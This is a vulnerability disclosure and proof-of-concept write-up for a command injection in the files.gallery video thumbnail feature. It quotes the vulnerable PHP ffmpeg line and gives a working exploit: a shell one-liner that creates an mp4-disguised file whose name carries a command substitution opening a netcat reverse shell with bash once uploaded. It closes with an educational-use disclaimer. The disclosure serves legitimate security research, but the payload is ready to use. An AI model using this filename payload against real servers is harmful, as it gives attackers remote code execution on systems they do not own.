# CVE-2024-53615

A command injection vulnerability in the video thumbnail rendering component of Karl Ward's [`files.gallery`](https://github.com/mjau-mjau/files.photo.gallery) `v0.3.0` through `0.11.0` allows remote attackers to execute arbitrary code via a crafted video file.
 Prerequisites:

- `ffmpeg` in `PATH`
- `config.php`: `'allow_upload' => true`
- `exec` must be enabled in PHP config

The vulnerability is in the following line (fetched from version `0.9.12`), which generates video previews:

```php
$cmd = $ffmpeg_path . ' -ss 3 -t 1 -hide_banner -i "' . str_replace('"', '\"', $this->path) . '" -frames:v 1 -an -vf "thumbnail,scale=480:320:force_original_aspect_ratio=increase,crop=480:320" -r 1 -y -f mjpeg "' . $cache . '" 2>&1';
```

As `$this->path` is user controllable, we can construct a malicious file whose title is a bash command substitution. It is important that this file must contain e.g., the mp4 magic bytes and the filename must end with `.mp4`:

```sh
$ echo "AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAQv7bW9vdgAAAGxtdmhk" | base64 -d > '$(nc 127.0.0.1 8443 -e bash).mp4'
```

If we upload this file, and refresh the page to make the application load the file, we obtain a shell on our local machine.

Note: the command is stored in the filename, so reverse shell possibilities are limited due to name length constraints.

## Disclaimer

This repository is intended solely for educational and research purposes.

Misuse Warning:
Using this tool for unauthorized or malicious activities is strictly prohibited and may violate local, state, or international laws. The author is not responsible for any misuse of this code.

Always obtain proper authorization before deploying this tool in any environment. By using this project, you agree to use it responsibly and ethically.
